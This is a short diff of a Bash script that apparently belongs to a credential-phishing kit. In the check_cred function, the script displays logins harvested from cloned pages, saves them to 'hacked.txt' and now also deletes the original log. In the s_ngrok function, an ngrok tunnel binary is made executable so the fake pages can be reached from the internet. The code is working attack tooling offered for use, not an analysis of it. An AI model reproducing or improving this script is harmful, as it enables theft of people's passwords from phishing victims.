@@ -34,8 +34,9 @@ check_cred(){
 			cat .pweb/$1/userlog.txt
 			echo -e "\n"
 			cp .pweb/$1/userlog.txt hacked.txt
+			rm -rf .pweb/$1/userlog.txt
 			echo -e "${w}[${r}+${w}] ${y} Saving data into hacked.txt"
-			exit 0
+			echo " "
 		fi
 	done
 }
@@ -54,7 +55,8 @@ s_ngrok(){
 			rm -rf ngrok-2.2.8-linux-386.zip
 			chmod +x *
 		else
-			echo -e "${r} Error Please try again"
+			chmod +x ngrok
+		#	echo -e "${r} Error Please try again"
 		fi
 	fi
 	ran=$((RANDOM % 10))
